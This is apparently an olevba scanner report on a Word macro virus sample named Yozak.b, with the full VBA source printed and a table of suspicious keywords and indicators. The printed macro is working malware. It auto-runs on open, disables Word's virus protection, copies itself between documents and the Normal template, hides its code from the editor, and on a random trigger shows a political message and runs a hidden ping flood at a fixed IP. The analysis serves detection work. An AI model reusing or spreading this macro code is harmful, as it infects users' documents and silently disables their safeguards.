olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Yozak.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Yozak.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Sub Alpha.b()
Sub autoopen()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Application.DisplayRecentFiles = False
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
CommandBars("Tools").Visible = False
If NormalTemplate.VBProject.VBComponents(2 - 1).CodeModule.Lines(1, 1) = "'Sub Alpha.b()" Then
ntii = 101
Else
ntii = 100
End If
If ActiveDocument.VBProject.VBComponents(2 - 1 + 1 - 1).CodeModule.Lines(1, 1) = "'Sub Alpha.b()" Then
adii = 101
Else
adii = 100
End If
If adii = 100 And ntii = 101 Then
a = NormalTemplate.VBProject.VBComponents(2 - 1).CodeModule.Lines(1, 50)
ActiveDocument.VBProject.VBComponents(2 - 1).CodeModule.DeleteLines 1, 1000
ActiveDocument.VBProject.VBComponents(2 - 1).CodeModule.AddFromstring a
ElseIf adii = 101 And ntii = 100 Then
a = ActiveDocument.VBProject.VBComponents(2 - 1).CodeModule.Lines(1, 50)
NormalTemplate.VBProject.VBComponents(2 - 1).CodeModule.DeleteLines 1, 1000
NormalTemplate.VBProject.VBComponents(2 - 1).CodeModule.AddFromstring a
End If
If Month(Now) = Int(12 * Rnd) Then
Selection.TypeText "Stop bomb attacks in KOSOVO NOW!!!"
Selection.TypeText "Somebody stop NATO-AMERICANS before it is TOO late"
Selection.TypeText ""
Selection.TypeText "Peace from Greece with love"
Selection.TypeText "Alpha.b Project form Dr.yozak"
Selection.TypeText "<-FREE OTCHALAN->"
Shell "c:\windows\ping.exe 22.22.22.222 -n " & Int(600000 * Rnd), vbHide
ActiveDocument.Save
ActiveDocument.AddToFavorites
MsgBox "-Greetz to the VX scene from Dr.yozak-"
MsgBox "-peace all over earth-" & vbCr & " Don't Bust VXers they write virii to gain knowledge" & vbCr & "Alpa.b Ptoject from 3C labs", vbApplicationModal, "Alpha.b dedicated to World Peace"
End If
End Sub
Sub viewvbcode()
On Error Resume Next
NormalTemplate.VBProject.VBComponents(10 - 9).CodeModule.DeleteLines 1, 50
NormalTemplate.Saved = False
ActiveDocument.VBProject.VBComponents(100 - 99).CodeModule.DeleteLines 1, 50
Application.ShowVisualBasicEditor = True
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |22.22.22.222        |IPv4 address                                 |
|IOC       |ping.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

